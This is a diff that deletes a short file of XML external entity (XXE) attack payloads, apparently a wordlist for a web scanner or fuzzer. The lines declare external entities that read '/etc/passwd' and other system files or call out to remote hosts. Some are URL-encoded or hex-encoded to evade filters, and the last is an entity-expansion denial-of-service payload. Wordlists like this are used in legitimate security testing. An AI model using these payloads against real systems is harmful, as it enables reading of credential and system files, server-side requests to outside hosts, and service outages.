@@ -1,9 +1,0 @@
-<!DOCTYPE root [<!ENTITY % test SYSTEM "xxxx">%test;]>
-<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "test">%remote;]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ip"> ]><username>&xxe;</username>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ip">%xxe; ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><username>&xxe;</username>
-<!DOCTYPE+xdsec+[<!ELEMENT+string+ANY+><!ENTITY+xxe+SYSTEM+"file%3a///etc/"+>]><string>%26xxe%3b</string>
-<!DOCTYPE%20foo%20[<!ENTITY%20xxe1a030%20SYSTEM%20"file%3a%2f%2f%2fetc%2fpasswd">%20]><ss>aa%26xxe1a030%3b<%2fss>
-%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%55%54%46%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%66%6f%6f%20%5b%3c%21%45%4e%54%49%54%59%20%25%20%78%78%65%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%38%2e%38%2e%38%2e%38%22%3e%25%78%78%65%3b%20%5d%3e
-<!DOCTYPE data [<!ELEMENT data (#ANY)><!ENTITY a0 "dos" ><!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;"><!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;">]><data>&a2;</data>
